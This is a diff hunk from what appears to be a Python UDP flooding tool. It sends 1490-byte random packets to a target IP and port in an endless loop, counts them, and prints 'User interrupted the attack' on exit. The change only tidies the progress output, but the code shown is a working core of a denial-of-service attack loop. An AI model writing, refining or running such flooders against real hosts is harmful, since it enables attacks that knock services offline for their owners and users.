@@ -49,8 +49,7 @@ while True:
         bytes = random._urandom(1490)  # Randomized Bytes
         _socket.sendto(bytes, (ip, port))  # Socket send packets
         sent = sent + 1
-        print(f"Sent {sent} -> {ip}:{port}")
-        sys.stdout.write("\033[K"
+        print(f"Sent {sent} -> {ip}:{port}\033[K")
     except KeyboardInterrupt:
         print("User interrupted the attack.")
         sys.exit()
